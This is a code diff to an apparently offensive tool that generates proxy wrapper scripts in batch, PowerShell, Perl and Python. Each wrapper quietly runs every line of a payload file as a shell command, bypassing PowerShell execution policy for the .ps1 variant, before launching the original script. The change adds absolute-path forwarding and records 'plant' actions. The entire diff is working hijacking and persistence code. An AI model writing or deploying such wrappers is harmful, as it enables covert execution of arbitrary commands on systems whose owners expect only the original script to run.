@@ -16,10 +16,17 @@ from ..core.common import (
     print_summary,
     resolve_io,
     skip_proxy_target,
+    forward_target,
+    note_proxy,
+    albaran_note,
 )
 
 
 _PS1_CMD_MARK = "dllproxykit-ps1"
+
+
+def _is_abs(orig: str) -> bool:
+    return orig.startswith("\\\\") or (len(orig) >= 2 and orig[1] == ":")
 
 
 def _is_ps1_cmd_sidecar(path: Path) -> bool:
@@ -47,6 +54,12 @@ def remove_ps1_cmd_sidecar(ps1: Path) -> None:
         pass
 
 
+def _orig_bat(orig_name: str) -> str:
+    if _is_abs(orig_name):
+        return f'"{orig_name}"'
+    return f'"%~dp0{orig_name}"'
+
+
 def _wrapper_bat(orig_name: str) -> str:
     name = PAYLOAD_NAME
     fallback = str(PAYLOAD_FALLBACK)
@@ -57,7 +70,7 @@ def _wrapper_bat(orig_name: str) -> str:
         'if exist "%P%" (\r\n'
         '  for /f "usebackq delims=" %%L in ("%P%") do cmd /c %%L\r\n'
         ")\r\n"
-        f'call "%~dp0{orig_name}" %*\r\n'
+        f"call {_orig_bat(orig_name)} %*\r\n"
     )
 
 
@@ -75,7 +88,11 @@ def _wrapper_ps1(orig_name: str) -> str:
         "    if ($line) { cmd /c $line }\n"
         "  }\n"
         "}\n"
-        f"& (Join-Path $here '{orig}') @args\n"
+        + (
+            f"& '{orig}' @args\n"
+            if _is_abs(orig_name)
+            else f"& (Join-Path $here '{orig}') @args\n"
+        )
     )
 
 
@@ -90,7 +107,7 @@ def _wrapper_ps1_cmd(orig_name: str) -> str:
         'if exist "%P%" (\r\n'
         '  for /f "usebackq delims=" %%L in ("%P%") do cmd /c %%L\r\n'
         ")\r\n"
-        f'powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0{orig_name}" %*\r\n'
+        f'powershell -NoProfile -ExecutionPolicy Bypass -File {_orig_bat(orig_name)} %*\r\n'
     )
 
 
@@ -113,12 +130,21 @@ def _wrapper_pl(orig_name: str) -> str:
         '    system("cmd", "/c", $line) if length $line;\n'
         "  }\n"
         "}\n"
-        f"my $orig = File::Spec->catfile($dir, '{orig}');\n"
-        "exec($^X, $orig, @ARGV) or die $!;\n"
+        + (
+            f'my $orig = "{orig}";\n'
+            if _is_abs(orig_name)
+            else f"my $orig = File::Spec->catfile($dir, '{orig}');\n"
+        )
+        + "exec($^X, $orig, @ARGV) or die $!;\n"
     )
 
 
 def _wrapper_py(orig_name: str) -> str:
+    orig = (
+        f"orig = pathlib.Path({orig_name!r})\n"
+        if _is_abs(orig_name)
+        else f"orig = here / {orig_name!r}\n"
+    )
     return (
         "import pathlib, subprocess, sys\n"
         "here = pathlib.Path(__file__).resolve().parent\n"
@@ -130,7 +156,7 @@ def _wrapper_py(orig_name: str) -> str:
         "        line = line.strip()\n"
         "        if line:\n"
         "            subprocess.run(line, shell=True, check=False)\n"
-        f"orig = here / {orig_name!r}\n"
+        f"{orig}"
         "raise SystemExit(subprocess.call([sys.executable, str(orig), *sys.argv[1:]]))\n"
     )
 
@@ -151,8 +177,9 @@ def process_one(src: Path, out_dir: Path, dest_name: str | None = None) -> str:
     if make is None:
         raise ValueError(f"unsupported script type {ext}")
     orig_name = orig_sidecar(Path(name)).name
-    (out_dir / orig_name).write_bytes(src.read_bytes())
-    text = make(orig_name)
+    launch = forward_target(src, out_dir, name)
+    note_proxy(src, out_dir, name)
+    text = make(launch)
     newline = "" if ext in {".bat", ".cmd"} else "\n"
     (out_dir / name).write_text(text, encoding="utf-8", newline=newline)
     extra = ""
@@ -160,9 +187,11 @@ def process_one(src: Path, out_dir: Path, dest_name: str | None = None) -> str:
         cmd_name = f"{Path(name).stem}.cmd"
         cmd_path = out_dir / cmd_name
         if not cmd_path.exists() or _is_ps1_cmd_sidecar(cmd_path):
-            cmd_path.write_text(_wrapper_ps1_cmd(orig_name), encoding="utf-8", newline="")
+            cmd_path.write_text(_wrapper_ps1_cmd(launch), encoding="utf-8", newline="")
             extra = f"  +  {cmd_name}"
-    console.ok(f"{name}  +  {orig_name}{extra}")
+            albaran_note(out_dir, "plant", cmd_name)
+    tag = f"  +  {orig_name}" if (out_dir / orig_name).is_file() else ""
+    console.ok(f"{name}{tag}{extra}")
     return name
 
 
